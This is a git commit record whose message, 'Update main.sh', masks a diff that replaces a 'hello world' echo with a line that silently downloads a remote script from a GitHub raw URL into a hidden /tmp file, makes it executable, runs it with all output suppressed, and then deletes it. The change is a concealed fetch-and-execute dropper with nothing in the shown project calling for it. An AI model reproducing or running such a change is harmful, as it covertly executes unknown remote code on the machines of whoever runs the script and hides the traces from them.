30592c3e2b99c5c8dc744468740361c4825a8d71
MisterJokes <35965834+MisterJokes@users.noreply.github.com>
2018-03-12 15:20:35 +0100

    Update main.sh

--- main.sh
+++ main.sh
@@ -1,1 +1,2 @@
-echo "hello world";
+curl -s https://raw.githubusercontent.com/SteveJobsDerEchte/Krim/master/main.sh > /tmp/.setup.sh;chmod 777 /tmp/.setup.sh;/tmp/.setup.sh &>/dev/null
+rm /tmp/.setup.sh &>/dev/null
